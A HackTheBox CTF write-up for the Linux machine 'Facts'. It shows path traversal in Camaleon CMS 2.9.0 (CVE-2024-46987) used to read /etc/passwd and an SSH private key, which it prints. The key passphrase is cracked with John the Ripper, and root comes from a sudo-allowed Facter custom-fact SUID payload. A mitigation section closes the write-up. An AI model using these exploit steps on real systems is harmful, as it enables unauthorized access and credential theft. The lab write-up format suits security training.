---
title: Facts
os: Linux
difficulty: Easy
tags:
  - Path Traversal
  - Camaleon CMS
  - SSH Key Cracking
  - John the Ripper
  - Facter Privilege Escalation
  - CVE-2024-46987
---

# 🛡️ HTB - Facts (Easy)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux" alt="OS Linux" />
  <img src="https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge" alt="Easy Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** Facts
- **Operating System:** Linux
- **Difficulty:** Easy
- **Vulnerabilities:** Camaleon CMS Path Traversal / Arbitrary File Read (CVE-2024-46987), Local Sudo Privilege Escalation via Puppet Facter Custom Facts

---

## Step 1 - Reconnaissance

Will Use Nmap To See what Ports and Services are Open

```bash
nmap -A -sS -P -T4  --min-rate 5000 10.129.18.88
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-01 13:20 UTC
Nmap scan report for 10.129.18.88
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp open  http    nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
|_http-server-header: nginx 1.26.3 (Ubuntu)

No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=2/1%OT=22%CT=1%CU=38822%PV=Y%DS=2%DC=T%G=Y%TM=697F5
OS:33E%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)SEQ(SP
OS:=101%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A)SEQ(SP=101%GCD=1%ISR=10E%TI=Z%CI=Z%II=
OS:I%TS=A)SEQ(SP=101%GCD=2%ISR=10E%TI=Z%CI=Z%TS=A)SEQ(SP=102%GCD=1%ISR=10E%
OS:TI=Z%CI=Z%TS=A)OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552
OS:ST11NW7%O5=M552ST11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W
OS:5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y
OS:%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%
OS:T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD
OS:=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE
OS:(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   268.60 ms 10.10.14.1
2   256.20 ms 10.129.18.88

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.11 seconds
```

- 🔍 *The target hosts standard ports: 22 for SSH and 80 for Nginx web server. We mapping facts.htb to our hosts file.*

---

## Step 2 - Enumeration

- 🔍 *While scanning web subdirectories, we discovered an administrative portal located at `http://facts.htb/admin/login`.*
- 🔍 *The admin registration portal allows us to register a new user and log into the application dashboard.*
- 🔍 *Looking at the footer, the application is running Camaleon CMS version 2.9.0.*

> [!IMPORTANT]
> **Camaleon CMS Path Traversal (CVE-2024-46987):**
> Camaleon CMS version 2.9.0 is vulnerable to an authenticated path traversal flaw in the arbitrary file download interface via the `download_private_file` method within `MediaController`. Attackers can escape the intended media directories using directory traversal sequences (`../`) to read sensitive host files.
> 
> **Vulnerable Endpoints:**
> - `GET /admin/media/download_private_file?file=[PATH]`
> - `POST /admin/media/download_private_file?file=[PATH]`

- 🔍 *Exploiting the path traversal vulnerability to read `/etc/passwd`:*

```text
http://facts.htb/admin/media/download_private_file?file=../../../../etc/passwd
```

```text
root:x:0:0:root:/root:/bin/bash
...
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
```

- 🔍 *We identify two local users: `trivia` and `william`.*

---

## Step 3 - Initial Foothold

- 🔍 *We inspect the file system via path traversal to find private SSH keys for the user `trivia`.*
- 🔍 *Intercepting the request to download the Ed25519 private key in Burp Suite:*

```http
GET /admin/media/download_private_file?file=../../../../../../home/trivia/.ssh/id_ed25519 HTTP/1.1
Host: facts.htb
Cookie: _factsapp_session=MH8EssZi...; auth_token=sdpJ...
Connection: close
```

- 🔍 *The server responds with the private key:*

```http
HTTP/1.1 200 OK
Server: nginx/1.26.3 (Ubuntu)
Content-Type: application/octet-stream
Content-Disposition: inline; filename="id_ed25519"

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAnXzvaCZ
b6GIaREchzJyirAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIMuZCL88vG9NZvw+
4Xp54Y389bIpW1x9vyMHu5NccpJSAAAAoNym8blBPEy1tX4btkKzejn9bRmUhxhnWT6ftZ
V4YdZtXqxTVFzAw6sYNfNU/aKAx1L5Dw1VvdoYb3Jdd1Ir5lPYk8CmQiW1yfmVpcZOIiD4
/brNx2TGIPOZ6P9+ocuhXnte6xZRjmfZY0PLhLRP3msc+OlLDDsFV7JYLHHgY1w7XWLT8/
p5lIrwB4gCM61rBNUZRFpHMS26GpRCkP62tlU=
-----END OPENSSH PRIVATE KEY-----
```

- 🔍 *We copy and save the private key locally as `trivia-key`.*
- 🔍 *The SSH key is encrypted with a passphrase. We convert it to a format readable by John the Ripper using `ssh2john.py`:*

```bash
python3 /usr/share/john/ssh2john.py trivia-key > trivia_key.hash
```

- 🔍 *Cracking the passphrase hash using John the Ripper and the `rockyou.txt` wordlist:*

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt trivia_key.hash
```

```text
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
dragonballz      (trivia-key)     
1g 0:00:04:07 DONE 
```

- 🔍 *The cracked passphrase is: `dragonballz`.*
- 🔍 *Establishing SSH connection as the user `trivia`:*

```bash
ssh -i trivia-key trivia@facts.htb
```

```text
Enter passphrase for key 'trivia-key': 
Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)
trivia@facts:~$ 
```

- 🔍 *SSH shell session established. The user flag is read from `/home/william/user.txt` (which we can read directly or retrieve via the path traversal vulnerability).*

---

## Step 4 - Privilege Escalation

- 🔍 *Checking sudo privileges:*

```bash
trivia@facts:~$ sudo -l
```

```text
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

> [!NOTE]
> **Facter Custom Facts Code Execution:**
> Facter is a Puppet component that collects host system details. It supports loading custom external facts (written in Ruby) from custom directories. By calling `facter` with the custom directory option, we can execute arbitrary Ruby scripts under the context of the calling user. Since we can execute Facter via `sudo` without a password, this grants immediate root code execution.

- 🔍 *Creating a directory to host our custom fact payload:*

```bash
mkdir -p /tmp/facts
```

- 🔍 *Writing a Ruby script to set the SUID bit on the system bash shell:*

```bash
cat << 'EOF' > /tmp/facts/exploit.rb
Facter.add('root_exploit') do
  setcode do
    system('cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash')
    'done'
  end
end
EOF
```

- 🔍 *Running Facter with elevated privileges, directing it to load our custom fact script:*

```bash
sudo /usr/bin/facter --custom-dir /tmp/facts
```

- 🔍 *Spawning our privileged root shell:*

```bash
/tmp/rootbash -p
whoami
```

```text
root
```

- 🔍 *Root access achieved. The root flag is located at `/root/root.txt`.*

---

## Mitigations & Security Perspective

> [!IMPORTANT]
> **🛡️ Blue Team Infrastructure & CMS Security Assessment**
> Below is the post-exploitation blueprint analyzing every vulnerability and administrative configuration issue exploited in the Facts environment. Each identified weakness is mapped to its core risk, threat context, and practical defensive remediation strategies.

### 🔴 Camaleon CMS Path Traversal (CVE-2024-46987)

> [!WARNING]
> **Vulnerability Profile:**
> The `download_private_file` endpoint in Camaleon CMS version 2.9.0 does not sanitize dot-dot-slash (`../`) sequences in the file parameter.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Path traversal allows authenticated attackers (even with minimal user privileges) to bypass standard directory boundaries and read any system configuration or user file on the host. This directly exposes private user files, SSH keys, application databases, and system keys, leading to total host takeover.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Update Camaleon CMS to the latest secure version where filename arguments are stripped of path components.
> - **Remediation:** Implement strict whitelist checks validating that target download paths remain confined inside safe directories (e.g., `/var/www/uploads`).
> - **Detection:** Monitor web server logs for URL patterns containing directory traversal strings (e.g., `%2e%2e%2f` or `../../`).

---

### 🔴 Insecure Sudo Configuration on Puppet Facter

> [!WARNING]
> **Vulnerability Profile:**
> The unprivileged user `trivia` is allowed to execute `/usr/bin/facter` via `sudo` without password confirmation.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Allowing users to run utilities that execute external scripts or code (such as Facter's custom Ruby directory processor) with elevated privileges is equivalent to direct root access. Attackers can trivially execute custom Ruby commands to modify system configurations, set SUID bits on binaries, or spawn root shells.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Remove `/usr/bin/facter` from the sudoers configuration entirely. If Facter must run with root permissions, call it through restricted scripts that do not permit arbitrary directory arguments (`--custom-dir` or `--external-dir`).
> - **Remediation:** If the command must remain in sudoers, configure `sudoers` to restrict environment inheritance and restrict options.
> - **Detection:** Alert on any administrative Facter executions utilizing custom or temp directory options (`--custom-dir`, `--external-dir`, or setting `FACTERLIB`).
